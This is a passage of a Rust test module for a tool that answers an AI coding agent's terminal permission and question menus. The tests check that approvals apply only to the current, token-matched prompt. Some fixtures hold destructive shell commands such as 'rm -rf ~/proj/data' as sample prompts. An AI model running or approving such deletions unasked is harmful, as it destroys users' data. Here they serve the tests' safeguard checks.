        // A rule in column 0 but short of the pane's width is content too.
        let short = format!("{rule}\n Bash command\n   rm -rf ~/proj/data\n{}\n Proceed?\n 1. Yes\n 2. No\n", "─".repeat(20));
        assert_eq!(parse(&short, Some(60)).unwrap().context[1], "rm -rf ~/proj/data");
    }

    /// A core that answers `terminal.get`, `terminal.read` and
    /// `terminal.keys` from fixed replies and records the keys pressed.
    struct Fake {
        get: Value,
        screen: String,
        keys: Option<Value>,
        pressed: std::cell::RefCell<Vec<Value>>,
    }

    impl Fake {
        fn blocked(kind: Option<&str>, turn: Option<u64>, screen: &str) -> Fake {
            let mut get = json!({ "status": { "state": "blocked", "kind": kind }, "cols": 32 });
            if let Some(t) = turn {
                get["turn"] = json!(t);
            }
            Fake { get, screen: screen.to_owned(), keys: Some(json!({ "turn": turn, "status": "blocked" })), pressed: Default::default() }
        }
    }

    impl Rpc for Fake {
        fn call_timeout(&self, method: &str, params: Value, timeout: Duration) -> anyhow::Result<Value> {
            match method {
                "terminal.get" => Ok(self.get.clone()),
                "terminal.read" => Ok(json!({ "text": self.screen })),
                "terminal.keys" => {
                    self.pressed.borrow_mut().push(params["keys"].clone());
                    match &self.keys {
                        Some(v) => Ok(v.clone()),
                        None => {
                            // The pane never goes quiet: the core holds the key.
                            std::thread::sleep(timeout);
                            anyhow::bail!("terminal.keys: no reply from core")
                        }
                    }
                }
                other => anyhow::bail!("unexpected {other}"),
            }
        }
    }

    fn ask<'a>(answer: &'a str, token: &'a str) -> AnswerArgs<'a> {
        AnswerArgs { terminal: "t3", answer, token, wait: None }
    }

    #[test]
    fn answer_presses_the_key_only_for_the_prompt_its_token_names() {
        let screen = claude("rm -rf build/");
        let core = Fake::blocked(Some("permission"), Some(4), &screen);
        let (kind, turn, p) = current(&core, "t3").unwrap();
        assert_eq!((kind.as_deref(), turn), (Some("permission"), 4));
        let t = token("t3", 4, &p);
        assert_eq!(answer(&core, &ask("approve", &t)), Ok(json!({ "terminal": "t3", "answered": 1, "label": "Yes" })));
        assert_eq!(*core.pressed.borrow(), [json!(["1"])]);
        // A stale token, or one from another turn: nothing pressed.
        let core = Fake::blocked(Some("permission"), Some(5), &screen);
        assert_eq!(answer(&core, &ask("approve", &t)).unwrap_err().0, 3);
        assert_eq!(answer(&core, &ask("1", "0000")).unwrap_err().0, 3);
        assert!(core.pressed.borrow().is_empty());
    }

    #[test]
    fn nothing_is_answered_unless_the_agent_is_blocked_on_a_menu() {
        let screen = claude("ls");
        let mut idle = Fake::blocked(None, Some(1), &screen);
        idle.get = json!({ "status": { "state": "working" }, "turn": 1 });
        assert_eq!(current(&idle, "t3").unwrap_err().0, 3);
        idle.get = json!({ "status": null });
        assert_eq!(current(&idle, "t3").unwrap_err().0, 3);
        assert_eq!(current(&Fake::blocked(None, Some(1), "just output\n$ "), "t3").unwrap_err().0, 3);
        // A core that doesn't count turns can't check an answer.
        assert_eq!(current(&Fake::blocked(None, None, &screen), "t3").unwrap_err().0, 1);
        // A sign-in, or a kind this doesn't know, is answered in its pane.
        for kind in ["auth", "something-new"] {
            assert_eq!(current(&Fake::blocked(Some(kind), Some(1), &screen), "t3").unwrap_err().0, 3, "{kind}");
        }
        // No kind said: read from the screen alone.
        assert!(current(&Fake::blocked(None, Some(1), &screen), "t3").is_ok());
    }

    #[test]
    fn a_question_takes_a_number_not_approve_or_deny() {
        let screen = "Which one?\n 1. Yes\n 2. No\n";
        let core = Fake::blocked(Some("question"), Some(2), screen);
        let (_, turn, p) = current(&core, "t3").unwrap();
        let t = token("t3", turn, &p);
        for named in ["approve", "deny"] {
            assert_eq!(answer(&core, &ask(named, &t)).unwrap_err().0, 2, "{named}");
        }
        assert!(core.pressed.borrow().is_empty());
        assert_eq!(answer(&core, &ask("2", &t)).unwrap()["answered"], 2);
    }

    #[test]
    fn a_key_that_waited_past_the_prompt_exits_4() {
        let screen = claude("ls");
        let mut core = Fake::blocked(Some("permission"), Some(4), &screen);
        let t = token("t3", 4, &current(&core, "t3").unwrap().2);
        // The agent moved on while the key waited, or stopped reporting blocked.
        for keys in [json!({ "turn": 5, "status": "blocked" }), json!({ "turn": 4, "status": "working" }), json!({ "turn": 4 }), json!({})] {
            core.keys = Some(keys.clone());
            assert_eq!(answer(&core, &ask("1", &t)).unwrap_err().0, 4, "{keys}");
        }
        // `--wait` runs out while someone keeps typing in the pane.
        core.keys = None;
        let mut a = ask("1", &t);
        a.wait = Some(Duration::from_millis(20));
        let (code, e) = answer(&core, &a).unwrap_err();
        assert_eq!(code, 4);
        assert!(e.contains("may still be queued"), "{e}");
    }
}
